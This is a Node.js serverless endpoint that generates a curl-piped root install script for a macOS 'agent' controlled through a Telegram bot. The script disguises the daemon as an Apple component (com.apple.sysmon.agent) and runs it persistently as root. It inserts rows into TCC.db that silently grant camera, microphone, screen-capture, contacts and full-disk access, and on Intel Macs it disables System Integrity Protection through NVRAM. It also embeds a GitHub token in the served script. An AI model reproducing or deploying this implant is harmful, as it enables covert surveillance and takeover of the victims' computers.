// GET /api/install?token=<ADMIN_TOKEN>[&ghToken=<GH_TOKEN>]
// Generates install.sh on-the-fly. Checks GitHub repo visibility server-side:
//   - Public repo  → direct releases/download/ URLs, no token in script
//   - Private repo → assets API + GH_TOKEN baked in, asset IDs resolved server-side
// ghToken is optional query param — falls back to GH_TOKEN Vercel env var.
// Usage (public repo or GH_TOKEN set in Vercel env):
//   curl -fsSL "https://mymac-config.vercel.app/api/install?token=ADMIN_TOKEN" | sudo bash
// Usage (private repo, no Vercel env var):
//   curl -fsSL "https://mymac-config.vercel.app/api/install?token=ADMIN_TOKEN&ghToken=ghp_xxx" | sudo bash

const https = require('https');
const REPO   = 'chocolaid/mymac';

function ghGet(path, ghToken) {
  return new Promise((resolve, reject) => {
    const headers = {
      'User-Agent': 'mymac-config-server',
      'Accept': 'application/vnd.github+json',
    };
    if (ghToken) headers['Authorization'] = 'Bearer ' + ghToken;
    const req = https.request({
      hostname: 'api.github.com',
      path,
      method: 'GET',
      headers,
    }, res => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(body) }); }
        catch (e) { reject(new Error('JSON parse error: ' + e.message)); }
      });
    });
    req.on('error', reject);
    req.end();
  });
}

export default async function handler(req, res) {
  if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });

  const { token, ghToken: ghTokenParam } = req.query;
  if (!token || token !== process.env.ADMIN_TOKEN) return res.status(401).json({ error: 'Unauthorized' });

  // GH_TOKEN: env var takes priority, query param is the fallback (useful when not set in Vercel)
  const ghToken = process.env.GH_TOKEN || ghTokenParam || '';

  // ── Fetch latest release (repo check + asset resolution in one call) ───────────
  let isPrivate, latestTag, arm64Id, amd64Id, checksumId;
  try {
    const repoRes = await ghGet(`/repos/${REPO}`, ghToken);
    if (repoRes.status === 404 && !ghToken) {
      return res.status(503).json({
        error: 'Repo not found without a token \u2014 it is likely private. ' +
               'Pass &ghToken=ghp_xxx or set GH_TOKEN in Vercel env vars.',
      });
    }
    if (repoRes.status !== 200) return res.status(502).json({ error: `GitHub repo check returned ${repoRes.status}` });
    isPrivate = repoRes.body.private === true;
  } catch (e) {
    return res.status(502).json({ error: 'GitHub repo check failed: ' + e.message });
  }

  // Resolve latest release tag
  try {
    const relRes = await ghGet(`/repos/${REPO}/releases/latest`, ghToken);
    if (relRes.status !== 200) return res.status(502).json({ error: `GitHub latest release returned ${relRes.status}` });
    latestTag = relRes.body.tag_name;
    if (!latestTag) return res.status(502).json({ error: 'No releases found — run build.sh first' });
    const assets = relRes.body.assets || [];
    arm64Id    = assets.find(a => a.name === 'agent-darwin-arm64')?.id;
    amd64Id    = assets.find(a => a.name === 'agent-darwin-amd64')?.id;
    checksumId = assets.find(a => a.name === 'checksums.txt')?.id;
    if (!arm64Id || !amd64Id) return res.status(502).json({ error: `Release assets missing from ${latestTag}` });
  } catch (e) {
    return res.status(502).json({ error: 'GitHub release fetch failed: ' + e.message });
  }

  let script;

  if (!isPrivate) {
    // ── PUBLIC REPO: simple direct URLs, no token needed ─────────────────────────
    const base = `https://github.com/${REPO}/releases/download/${latestTag}`;
    script = buildPublicScript(base);
  } else {
    // ── PRIVATE REPO: resolve asset IDs server-side, bake GH_TOKEN ───────────────
    if (!ghToken) {
      return res.status(503).json({
        error: 'Repo is private but no GH_TOKEN available. ' +
               'Either set GH_TOKEN in Vercel env vars, or pass &ghToken=ghp_xxx in the URL.',
      });
    }
    script = buildPrivateScript(ghToken, arm64Id, amd64Id, checksumId);
  }

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  res.status(200).send(script);
}

// ── Shared header lines ────────────────────────────────────────────────────────
function scriptHeader() {
  return [
    '#!/usr/bin/env bash',
    '# install.sh – mymac agent installer (auto-generated, no prompts)',
    '# ─────────────────────────────────────────────────────────────────────────────',
    'set -euo pipefail',
    '',
    "RED='\\033[0;31m'; GREEN='\\033[0;32m'; YELLOW='\\033[1;33m'",
    "CYAN='\\033[0;36m'; BOLD='\\033[1m'; RESET='\\033[0m'",
    "info()    { echo -e \"${CYAN}[•]${RESET} $*\"; }",
    "success() { echo -e \"${GREEN}[✓]${RESET} $*\"; }",
    "warn()    { echo -e \"${YELLOW}[!]${RESET} $*\"; }",
    "die()     { echo -e \"${RED}[✗]${RESET} $*\" >&2; exit 1; }",
    '',
    '# ── Guards ────────────────────────────────────────────────────────────────────',
    '[[ $EUID -eq 0 ]]            || die "Run as root: sudo bash <(curl ...)"',
    '[[ "$(uname)" == "Darwin" ]] || die "macOS only."',
    'command -v curl &>/dev/null  || die "curl required."',
    'ARCH="$(uname -m)"',
    '[[ "$ARCH" == "arm64" || "$ARCH" == "x86_64" ]] || die "Unsupported arch: $ARCH"',
    '',
    '# ── Spinner ───────────────────────────────────────────────────────────────────',
    'spinner() {',
    '  local pid=$! msg="$1" chars="|/-\\\\" i=0',
    '  while kill -0 "$pid" 2>/dev/null; do',
    '    printf "\r  ${CYAN}%s${RESET} %s" "${chars:$((i%4)):1}" "$msg"',
    '    ((i++)) || true; sleep 0.08',
    '  done',
    '  printf "\r%*s\r" "$((${#msg}+6))" ""',
    '}',
    '',
    '# ── Install paths ─────────────────────────────────────────────────────────────',
    'AGENT_LABEL="com.apple.sysmon.agent"',
    'BINARY_PATH="/usr/local/libexec/${AGENT_LABEL}"',
    'PLIST_PATH="/Library/LaunchDaemons/${AGENT_LABEL}.plist"',
    'LOG_PATH="/var/log/${AGENT_LABEL}.log"',
    'ERR_PATH="/var/log/${AGENT_LABEL}.err"',
  ];
}

// ── Public download section ────────────────────────────────────────────────────
function buildPublicScript(base) {
  return [
    ...scriptHeader(),
    '',
    '# ── Download URLs (public repo — no token needed) ─────────────────────────────',
    `URL_ARM64="${base}/agent-darwin-arm64"`,
    `URL_AMD64="${base}/agent-darwin-amd64"`,
    `CHECKSUM_URL="${base}/checksums.txt"`,
    '',
    '[[ "$ARCH" == "arm64" ]] && DL_URL="$URL_ARM64" && BINARY_NAME="agent-darwin-arm64" \\',
    '  || { DL_URL="$URL_AMD64"; BINARY_NAME="agent-darwin-amd64"; }',
    '',
    ...scriptBanner(),
    '',
    '# ── Download binary ───────────────────────────────────────────────────────────',
    'TMPBIN="$(mktemp)"',
    'echo -e "  ${CYAN}[•]${RESET} Downloading ${BOLD}${BINARY_NAME}${RESET}..."',
    'curl -fL --retry 3 --retry-delay 2 --progress-bar -o "$TMPBIN" "$DL_URL" 2>/dev/tty \\',
    '  || die "Download failed — check your internet connection."',
    '',
    'file "$TMPBIN" | grep -qi "mach-o" || die "Not a macOS binary. Got: $(file $TMPBIN | head -1)"',
    'success "Downloaded $(du -sh "$TMPBIN" | cut -f1)"',
    '',
    '# ── Checksum verification ─────────────────────────────────────────────────────',
    'info "Verifying checksum..."',
    'CHECKSUM_FILE="$(mktemp)"',
    'if curl -fsSL --retry 2 -o "$CHECKSUM_FILE" "$CHECKSUM_URL" 2>/dev/null; then',
    '  EXPECTED_SHA="$(grep "${BINARY_NAME}" "$CHECKSUM_FILE" | awk \'{print $1}\')"',
    '  rm -f "$CHECKSUM_FILE"',
    '  if [[ -n "$EXPECTED_SHA" ]]; then',
    '    ACTUAL_SHA="$(shasum -a 256 "$TMPBIN" | awk \'{print $1}\')"',
    '    [[ "$ACTUAL_SHA" == "$EXPECTED_SHA" ]] \\',
    '      && success "Checksum verified." \\',
    '      || { rm -f "$TMPBIN"; die "Checksum mismatch!\\n  Expected: $EXPECTED_SHA\\n  Got: $ACTUAL_SHA"; }',
    '  else',
    '    warn "No entry for ${BINARY_NAME} in checksums — skipping."',
    '  fi',
    'else',
    '  rm -f "$CHECKSUM_FILE"',
    '  warn "Could not download checksums — skipping verification."',
    'fi',
    '',
    ...scriptInstall(),
  ].join('\n');
}

// ── Private download section ───────────────────────────────────────────────────
function buildPrivateScript(ghToken, arm64Id, amd64Id, checksumId) {
  return [
    ...scriptHeader(),
    '',
    '# ── Pre-resolved asset IDs (private repo — baked in by Vercel) ───────────────',
    `GH_TOKEN="${ghToken}"`,
    `ASSET_ID_ARM64="${arm64Id}"`,
    `ASSET_ID_AMD64="${amd64Id}"`,
    `CHECKSUM_ASSET_ID="${checksumId || ''}"`,
    'GH_ASSETS_BASE="https://api.github.com/repos/chocolaid/mymac/releases/assets"',
    '',
    '[[ "$ARCH" == "arm64" ]] && ASSET_ID="$ASSET_ID_ARM64" && BINARY_NAME="agent-darwin-arm64" \\',
    '  || { ASSET_ID="$ASSET_ID_AMD64"; BINARY_NAME="agent-darwin-amd64"; }',
    '',
    ...scriptBanner(),
    '',
    '# ── Download binary (private repo via assets API) ─────────────────────────────',
    '# curl -L (NOT --location-trusted): GitHub returns 302 → S3 pre-signed URL.',
    '# Dropping the auth header on redirect is required — S3 rejects it.',
    'TMPBIN="$(mktemp)"',
    'echo -e "  ${CYAN}[•]${RESET} Downloading ${BOLD}${BINARY_NAME}${RESET}..."',
    'curl -fL --retry 3 --retry-delay 2 --progress-bar -L \\',
    '  -H "Authorization: token ${GH_TOKEN}" \\',
    '  -H "Accept: application/octet-stream" \\',
    '  -o "$TMPBIN" \\',
    '  "${GH_ASSETS_BASE}/${ASSET_ID}" 2>/dev/tty \\',
    '  || die "Download failed — token may have expired (github.com/settings/tokens)"',
    '',
    'file "$TMPBIN" | grep -qi "mach-o" || die "Not a macOS binary. Got: $(file $TMPBIN | head -1)"',
    'success "Downloaded $(du -sh "$TMPBIN" | cut -f1)"',
    '',
    '# ── Checksum verification ─────────────────────────────────────────────────────',
    'info "Verifying checksum..."',
    'if [[ -n "${CHECKSUM_ASSET_ID}" ]]; then',
    '  CHECKSUM_FILE="$(mktemp)"',
    '  if curl -fsSL --retry 2 -L \\',
    '    -H "Authorization: token ${GH_TOKEN}" \\',
    '    -H "Accept: application/octet-stream" \\',
    '    -o "$CHECKSUM_FILE" \\',
    '    "${GH_ASSETS_BASE}/${CHECKSUM_ASSET_ID}" 2>/dev/null; then',
    '    EXPECTED_SHA="$(grep "${BINARY_NAME}" "$CHECKSUM_FILE" | awk \'{print $1}\')"',
    '    rm -f "$CHECKSUM_FILE"',
    '    if [[ -n "$EXPECTED_SHA" ]]; then',
    '      ACTUAL_SHA="$(shasum -a 256 "$TMPBIN" | awk \'{print $1}\')"',
    '      [[ "$ACTUAL_SHA" == "$EXPECTED_SHA" ]] \\',
    '        && success "Checksum verified." \\',
    '        || { rm -f "$TMPBIN"; die "Checksum mismatch!\\n  Expected: $EXPECTED_SHA\\n  Got: $ACTUAL_SHA"; }',
    '    else',
    '      warn "No entry for ${BINARY_NAME} in checksums — skipping."',
    '    fi',
    '  else',
    '    rm -f "$CHECKSUM_FILE"',
    '    warn "Could not download checksums — skipping verification."',
    '  fi',
    'else',
    '  warn "No checksum asset ID — skipping."',
    'fi',
    '',
    ...scriptInstall(),
  ].join('\n');
}

function scriptBanner() {
  return [
    'echo -e "\\n${BOLD}╔══════════════════════════════════════════╗"',
    'echo -e "║       mymac agent – installer v2         ║"',
    'echo -e "╚══════════════════════════════════════════╝${RESET}\\n"',
    'echo -e "  Arch: ${CYAN}${ARCH}${RESET}  Binary: ${CYAN}${BINARY_NAME}${RESET}"',
    'echo ""',
  ];
}

function scriptTCCProvision() {
  return [
    '# ── SIP check + TCC pre-provisioning ─────────────────────────────────────────',
    "SIP_STATUS=\"$(csrutil status 2>/dev/null || echo 'unknown')\"",
    'SIP_ON=false',
    'REBOOT_NEEDED=false',
    '[[ "$SIP_STATUS" == *"enabled"* ]] && SIP_ON=true',
    '',
    "CONSOLE_USER=\"$(stat -f '%Su' /dev/console 2>/dev/null || true)\"",
    'if [[ -z "$CONSOLE_USER" || "$CONSOLE_USER" == "root" ]]; then',
    '  CONSOLE_USER="$(ls /Users | grep -v Shared | head -1)"',
    'fi',
    'USER_TCC_DB="/Users/${CONSOLE_USER}/Library/Application Support/com.apple.TCC/TCC.db"',
    'SYSTEM_TCC_DB="/Library/Application Support/com.apple.TCC/TCC.db"',
    '',
    'tcc_grant() {',
    '  local db="$1" svc="$2" bin="$3"',
    "  local q=\"INSERT OR REPLACE INTO access \\",
    '    (service,client,client_type,auth_value,auth_reason,auth_version,\\',
    "indirect_object_identifier,flags,last_modified) \\",
    "    VALUES('${svc}','${bin}',1,2,4,1,'UNUSED',0,CAST(strftime('%s','now') AS INTEGER));\"",
    '  sqlite3 "$db" "$q" 2>/dev/null && return 0 || return 1',
    '}',
    '',
    'info "Provisioning user TCC grants..."',
    'USER_SERVICES=(',
    '  kTCCServiceSystemPolicyDesktopFolder',
    '  kTCCServiceSystemPolicyDocumentsFolder',
    '  kTCCServiceSystemPolicyDownloadsFolder',
    '  kTCCServicePhotos kTCCServiceCamera kTCCServiceMicrophone',
    '  kTCCServiceAddressBook kTCCServiceCalendar',
    ')',
    'for svc in "${USER_SERVICES[@]}"; do',
    '  if [[ -f "$USER_TCC_DB" ]]; then',
    '    tcc_grant "$USER_TCC_DB" "$svc" "$BINARY_PATH" \\',
    '      && success "  TCC user:   ${svc}" \\',
    '      || warn    "  TCC user:   ${svc} — skipped"',
    '  else',
    '    warn "  User TCC.db not found for ${CONSOLE_USER} — skipping"',
    '    break',
    '  fi',
    'done',
    '',
    'SYSTEM_SERVICES=(kTCCServiceScreenCapture kTCCServiceAccessibility kTCCServiceSystemPolicyAllFiles kTCCServiceDeveloperTool)',
    '',
    'if ! $SIP_ON; then',
    '  info "SIP disabled — applying system TCC grants..."',
    '  for svc in "${SYSTEM_SERVICES[@]}"; do',
    '    tcc_grant "$SYSTEM_TCC_DB" "$svc" "$BINARY_PATH" \\',
    '      && success "  TCC system: ${svc}" \\',
    '      || warn    "  TCC system: ${svc} — skipped"',
    '  done',
    '',
    'elif [[ "$ARCH" == "x86_64" ]]; then',
    '  info "Intel + SIP on — writing NVRAM to disable SIP on next boot..."',
    '  nvram csr-active-config=%77%00%00%00 2>/dev/null \\',
    '    && success "NVRAM written — SIP disabled after reboot." \\',
    '    || warn    "NVRAM write failed — disable SIP manually in Recovery."',
    '',
    '  ONESHOT_LABEL="com.apple.sysmon.tccprovision"',
    '  ONESHOT_PLIST="/Library/LaunchDaemons/${ONESHOT_LABEL}.plist"',
    '  ONESHOT_SCRIPT="/usr/local/libexec/${ONESHOT_LABEL}.sh"',
    "  cat > \"$ONESHOT_SCRIPT\" << 'ONESHOT'",
    '#!/usr/bin/env bash',
    'BIN="/usr/local/libexec/com.apple.sysmon.agent"',
    'DB="/Library/Application Support/com.apple.TCC/TCC.db"',
    'q() { sqlite3 "$DB" "INSERT OR REPLACE INTO access (service,client,client_type,auth_value,auth_reason,auth_version,indirect_object_identifier,flags,last_modified) VALUES(\'$1\',\'$BIN\',1,2,4,1,\'UNUSED\',0,CAST(strftime(\'%s\',\'now\') AS INTEGER));" 2>/dev/null; }',
    'q kTCCServiceScreenCapture; q kTCCServiceAccessibility',
    'q kTCCServiceSystemPolicyAllFiles; q kTCCServiceDeveloperTool',
    'launchctl unload /Library/LaunchDaemons/com.apple.sysmon.tccprovision.plist 2>/dev/null || true',
    'rm -f /Library/LaunchDaemons/com.apple.sysmon.tccprovision.plist /usr/local/libexec/com.apple.sysmon.tccprovision.sh',
    'ONESHOT',
    '  chmod 0700 "$ONESHOT_SCRIPT"; chown root:wheel "$ONESHOT_SCRIPT"',
    '  cat > "$ONESHOT_PLIST" << OPLIST',
    '<?xml version="1.0" encoding="UTF-8"?>',
    '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
    '<plist version="1.0"><dict>',
    '  <key>Label</key><string>${ONESHOT_LABEL}</string>',
    '  <key>ProgramArguments</key><array><string>/bin/bash</string><string>${ONESHOT_SCRIPT}</string></array>',
    '  <key>UserName</key><string>root</string>',
    '  <key>RunAtLoad</key><true/><key>KeepAlive</key><false/>',
    '</dict></plist>',
    'OPLIST',
    '  chmod 644 "$ONESHOT_PLIST"; chown root:wheel "$ONESHOT_PLIST"',
    '  success "One-shot TCC provisioner installed — system grants apply on next boot."',
    '  REBOOT_NEEDED=true',
    '',
    'else',
    '  warn "Apple Silicon + SIP on — ScreenCapture/Accessibility need Recovery Mode."',
    '  warn "  Hold power → Options → Terminal → csrutil disable → reboot, then /tccprovision."',
    'fi',
    '',
  ];
}

function scriptInstall() {
  return [
    '# ── Install binary ────────────────────────────────────────────────────────────',
    'info "Installing binary..."',
    'mkdir -p "$(dirname "$BINARY_PATH")"',
    '{ install -m 0755 -o root -g wheel "$TMPBIN" "$BINARY_PATH" && xattr -c "$BINARY_PATH" 2>/dev/null; } &',
    'spinner "Copying to ${BINARY_PATH}"',
    'wait $!',
    'rm -f "$TMPBIN"',
    'success "Binary installed → ${BINARY_PATH}"',
    '',
    '# ── Write LaunchDaemon plist ──────────────────────────────────────────────────',
    'info "Installing LaunchDaemon..."',
    'cat > "$PLIST_PATH" <<PLIST',
    '<?xml version="1.0" encoding="UTF-8"?>',
    '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"',
    '  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
    '<plist version="1.0">',
    '<dict>',
    '  <key>Label</key>',
    '  <string>${AGENT_LABEL}</string>',
    '  <key>ProgramArguments</key>',
    '  <array>',
    '    <string>${BINARY_PATH}</string>',
    '  </array>',
    '  <key>UserName</key>',
    '  <string>root</string>',
    '  <key>RunAtLoad</key>',
    '  <true/>',
    '  <key>KeepAlive</key>',
    '  <true/>',
    '  <key>ThrottleInterval</key>',
    '  <integer>10</integer>',
    '  <key>StandardOutPath</key>',
    '  <string>${LOG_PATH}</string>',
    '  <key>StandardErrorPath</key>',
    '  <string>${ERR_PATH}</string>',
    '  <key>EnvironmentVariables</key>',
    '  <dict>',
    '    <key>PATH</key>',
    '    <string>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/homebrew/bin</string>',
    '    <key>HOME</key>',
    '    <string>/var/root</string>',
    '  </dict>',
    '  <key>Nice</key>',
    '  <integer>0</integer>',
    '</dict>',
    '</plist>',
    'PLIST',
    '',
    'chmod 644 "$PLIST_PATH"',
    'chown root:wheel "$PLIST_PATH"',
    'success "LaunchDaemon plist installed."',
    '',
    '# ── Log files ─────────────────────────────────────────────────────────────────',
    'touch "$LOG_PATH" "$ERR_PATH"',
    'chmod 640 "$LOG_PATH" "$ERR_PATH"',
    'chown root:wheel "$LOG_PATH" "$ERR_PATH"',
    '',
    ...scriptTCCProvision(),
    '# ── Reload if upgrading ───────────────────────────────────────────────────────',
    'if launchctl list "$AGENT_LABEL" &>/dev/null 2>&1; then',
    '  info "Stopping existing agent (upgrade)..."',
    '  launchctl unload "$PLIST_PATH" 2>/dev/null || true',
    '  sleep 1',
    'fi',
    '',
    '# ── Load daemon ───────────────────────────────────────────────────────────────',
    'info "Loading LaunchDaemon..."',
    'launchctl load -w "$PLIST_PATH"',
    'sleep 3',
    'if launchctl list "$AGENT_LABEL" &>/dev/null 2>&1; then',
    '  success "Agent is running as a root system daemon."',
    'else',
    '  warn "Daemon registered but may still be starting."',
    '  warn "  Check: sudo launchctl list ${AGENT_LABEL}"',
    'fi',
    '',
    '# ── Done ─────────────────────────────────────────────────────────────────────',
    'echo ""',
    'echo -e "${BOLD}╔══════════════════════════════════════════╗"',
    'echo -e "║         Installation complete ✓          ║"',
    'echo -e "╚══════════════════════════════════════════╝${RESET}"',
    'echo ""',
    'echo -e "  Binary:  ${CYAN}${BINARY_PATH}${RESET}"',
    'echo -e "  Log:     ${CYAN}tail -f ${LOG_PATH}${RESET}"',
    'echo ""',
    'echo -e "  ${BOLD}Next:${RESET} Check Telegram — this Mac will appear in /devices once the bot is online."',
    'echo ""',
  ];
}
